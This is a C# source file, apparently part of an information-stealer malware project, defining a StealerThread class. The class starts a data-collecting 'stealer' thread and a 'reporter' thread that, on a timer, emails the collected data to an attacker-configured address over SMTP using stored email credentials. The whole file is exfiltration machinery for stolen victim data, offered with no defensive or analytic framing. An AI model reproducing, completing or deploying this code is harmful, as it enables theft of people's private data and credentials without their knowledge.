using System.Threading;
using System.Windows.Forms;
using sub.Util.Misc;
using sub.Util.Net;

namespace sub.Util.Threading
{
    internal class StealerThread
    {
        private Thread _stealer;
        private Thread _reporter;
        private int _delay;

        public StealerThread(IStealer stealer, int delay)
        {
            _delay = delay;
            _stealer = new Thread(stealer.Collect);
            _reporter = new Thread(delegate()
                                       {
                                           while (true)
                                           {
                                               bool runOnce = _delay <= 0;
                                               if (!runOnce)
                                               {
                                                   Thread.Sleep(_delay*60000);
                                               }
                                               MessageBox.Show(stealer.Data);
                                               new ReportEmail(stealer.GetType().Name, Settings.EmailAddress,
                                                               Settings.EmailPassword,
                                                               Settings.SmtpAddress, Settings.SmtpPort).Send(
                                                                   stealer.Data);
                                               if (runOnce)
                                               {
                                                   _stealer.Abort();
                                                   _reporter.Abort();
                                               }
                                           }
                                       });
            Variables.stealerPool.Add(this);
        }

        public void Start()
        {
            _stealer.Start();
            _reporter.Start();
        }

        public int GetDelay()
        {
            return _delay;
        }

        public Thread GetStealerThread()
        {
            return _stealer;
        }

        public Thread GetReporterThread()
        {
            return _reporter;
        }
    }
}